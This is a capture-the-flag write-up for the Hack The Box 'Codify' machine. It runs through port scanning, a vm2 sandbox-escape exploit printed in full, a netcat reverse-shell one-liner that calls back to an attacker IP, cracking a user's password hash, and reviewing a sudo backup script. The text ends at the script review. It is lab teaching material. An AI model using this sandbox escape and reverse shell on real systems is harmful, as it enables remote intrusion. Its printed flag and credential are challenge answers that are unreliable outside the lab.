# Codify
> Write-up author: jon-brandy
## Lesson learned: 
- Virtual Machine 2 (VM2) exploitation.
- Bash script review.
- Python bruteforce script.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ed060495-9bbf-4521-8586-e52f9f08aa52)

> PORT SCANNNING:

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.11.239 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-18 00:36 PST
Warning: 10.10.11.239 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.239
Host is up (0.033s latency).
Not shown: 53951 closed tcp ports (conn-refused), 11581 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 275.72 seconds
```

1. Based from the nmap results, we can identified that the machine runs a web application, opens ssh login and using node.js framework for the webapp.

> WEBAPP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/95dde7ef-9cee-480e-b93f-0a705d53d68d)


2. Reading the **About Us** page, shows us the door to exploit this web app, the `vm2 (virtual machine 2)` vuln.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/31abcec5-c414-408a-b0eb-170397adf10b)


3. Searching on the internet about vm2 vulns, shall resulting to this:

```
VM2 --> Is a library that provides a secure and sandboxed environment for executing JavaScript code. Primarily used in server side
environments such as Node-JS.

https://www.uptycs.com/blog/exploitable-vm2-vulnerabilities (the newest one --> 2023).
```

4. Also found a github POC.

```
https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0d9e4426-3a8a-4331-8efd-6e217c3944e9)


```txt
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```


5. To test the POC, we can try by sending --> `ls ./`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/edbefc30-e90b-43de-9bb7-1f2c1cd21182)


6. Great it executes our bash command, hence let's put our reverse shell payload there.

> succeed payload

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 1337 >/tmp/f
```

> RESULT

```txt
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 1337 >/tmp/f');
}
`

console.log(vm.run(code));
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6bfefadb-8436-41fa-9b1d-f3f59fd34bd2)


7. Notice that there is a user named **joshua** and we can't cd there.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9c1ec6bd-8f41-47e6-b0ab-00071936ae8a)


8. Now we need to enumerate dirs and files, our objective should be a config file or .db file.
9. Long story short, found tickets.db at --> `/var/www/contacts`.

> FOUND JOSHUA CRED

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/01d4894f-6888-49be-bc35-a6f23e924dd4)


10. Let's crack the hash using rockyou.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b6da0163-21cd-47dd-8124-6e2c68ab4850)

#### NOTES: If you want to list all available formats, simply run --> john --list-formats

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/126301b7-5671-40f1-a3c0-6db8763d1213)


11. Great! Now we have joshua cred --> `joshua:spongebob1`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ef4eba08-3270-468b-a430-137ca16ea7f4)


> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fcbec800-39a2-48a2-8fbf-59ee500e1b39)


## USER FLAG

```
cf933e03df80d5ec0e913a06dea26830
```


12. Checking sudo permission for **joshua** resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d41fdbef-d8a0-4162-b4e8-6eb0d1124ed3)


> BASH SCRIPT

```
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

13. Reviewing the bash script, found the vuln at the comparison. 
